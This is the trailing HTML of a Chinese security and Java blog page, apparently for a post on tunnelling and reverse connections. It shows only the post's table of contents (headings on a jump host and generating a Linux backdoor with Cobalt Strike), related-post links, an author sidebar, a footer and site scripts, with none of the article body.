隧道</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%B3%E6%9D%BF%E6%9C%BAlinux%E9%80%9A%E8%AE%AFwin7"><span class="toc-number">4.1.</span> <span class="toc-text">跳板机 Linux 通讯 win7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cs%E7%94%9F%E6%88%90linux%E5%90%8E%E9%97%A8%E6%8E%A7%E5%88%B6"><span class="toc-number">4.2.</span> <span class="toc-text">CS 生成 Linux 后门控制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-%E5%8A%A0%E8%BD%BD%E6%8F%92%E4%BB%B6"><span class="toc-number">4.2.1.</span> <span class="toc-text">0X01 加载插件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-%E5%88%9B%E5%BB%BA%E7%9B%91%E5%90%AC"><span class="toc-number">4.2.2.</span> <span class="toc-text">0X02 创建监听</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-%E7%94%9F%E6%88%90%E5%90%8E%E9%97%A8"><span class="toc-number">4.2.3.</span> <span class="toc-text">0X03 生成后门</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2024/04/29/%E5%9F%9F%E9%98%B2%E7%81%AB%E5%A2%99/" rel="bookmark" title="域防火墙规则策略 & 隧道代理区别">域防火墙规则策略 & 隧道代理区别</a></li><li class="active"><a href="/2024/05/01/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" rel="bookmark" title="隧道技术& DNS/SSH Linux反向上线">隧道技术& DNS/SSH Linux反向上线</a></li><li><a href="/2024/05/03/SMB%E9%9A%A7%E9%81%93/" rel="bookmark" title="SMB反向连接隧道 & 防火墙替换">SMB反向连接隧道 & 防火墙替换</a></li><li><a href="/2024/05/15/%E4%BB%A3%E7%90%86%E8%BD%AF%E4%BB%B6%E6%8A%80%E6%9C%AF-CS-MSF%E4%BB%A3%E7%90%86%E8%B7%B3%E6%9D%BF/" rel="bookmark" title="代理软件&CS/MSF代理跳板">代理软件&CS/MSF代理跳板</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="月" data-src="/images/avatar.jpg"><p class="name" itemprop="name">月</p><div class="description" itemprop="description">你越安静 你听到的就越多</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">46</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">7</span> <span class="name">分类</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL0x1bmFSR29k" title="https:&#x2F;&#x2F;github.com&#x2F;LunaRGod"><i class="ic i-github"></i></span> <span class="exturl item twitter" data-url="aHR0cHM6Ly94LmNvbS95dWVzZTEwMjkxMDQ1Mw==" title="https:&#x2F;&#x2F;x.com&#x2F;yuese102910453"><i class="ic i-twitter"></i></span> <span class="exturl item zhihu" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3Blb3BsZS9mZW5nLWppYW4tNDgtNjc=" title="https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;feng-jian-48-67"><i class="ic i-zhihu"></i></span> <span class="exturl item music" data-url="aHR0cHM6Ly9tdXNpYy4xNjMuY29tLyMvdXNlci9ob21lP2lkPTE2NjY5MDk3ODQ=" title="https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;1666909784"><i class="ic i-cloud-music"></i></span> <span class="exturl item email" data-url="bWFpbHRvOnNhYmVyMGRheUBxcS5jb20=" title="mailto:saber0day@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2024/04/30/Object%E5%86%85%E9%83%A8%E7%B1%BB%E5%BC%82%E5%B8%B8/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2024/05/03/%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4%E7%B1%BB%E5%8C%85%E8%A3%85%E7%B1%BB/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BAWP/" title="分类于 渗透靶场WP">渗透靶场WP</a></div><span><a href="/2024/07/08/DC-3/" title="DC-3靶场">DC-3靶场</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" title="分类于 网络安全">网络安全</a></div><span><a href="/2024/02/19/%E5%8A%A0%E8%A7%A3%E5%AF%86/" title="加解密算法逆向密文">加解密算法逆向密文</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Java/" title="分类于 Java">Java</a></div><span><a href="/2024/07/10/JavaBean/" title="JavaBean">JavaBean</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Java/" title="分类于 Java">Java</a></div><span><a href="/2024/04/12/%E7%BB%A7%E6%89%BF%E5%A4%9A%E6%80%81%E6%8A%BD%E8%B1%A1/" title="继承 super 抽象 接口 多态">继承 super 抽象 接口 多态</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Java/" title="分类于 Java">Java</a></div><span><a href="/2024/05/10/Map%E5%8F%8C%E5%88%97%E9%9B%86%E5%90%88%E6%A0%B9%E6%8E%A5%E5%8F%A3HashMap_TreeMap/" title="Map双列集合根接口HashMap_TreeMap">Map双列集合根接口HashMap_TreeMap</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/" title="分类于 内网攻防">内网攻防</a></div><span><a href="/2024/06/09/%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/" title="非约束委派 非约束委派 靶场">非约束委派 非约束委派 靶场</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Java/" title="分类于 Java">Java</a></div><span><a href="/2024/05/03/%E6%97%A5%E6%9C%9F%E6%97%B6%E9%97%B4%E7%B1%BB%E5%8C%85%E8%A3%85%E7%B1%BB/" title="日期时间类 包装类">日期时间类 包装类</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Java/" title="分类于 Java">Java</a></div><span><a href="/2024/04/30/Object%E5%86%85%E9%83%A8%E7%B1%BB%E5%BC%82%E5%B8%B8/" title="Objbect  内部类异常">Objbect 内部类异常</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2/" title="分类于 内网攻防">内网攻防</a></div><span><a href="/2024/09/19/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E5%88%A9%E7%94%A8/" title="横向移动利用总结">横向移动利用总结</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="分类于 漏洞复现">漏洞复现</a></div><span><a href="/2024/09/29/Nginx/" title="Nginx漏洞复现">Nginx漏洞复现</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2023 – <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">月 @ LunaRGFod</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">350k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">5:18</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2024/05/01/隧道技术/",favicon:{show:"Monthlblog",hide:"Monthlyblog"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html>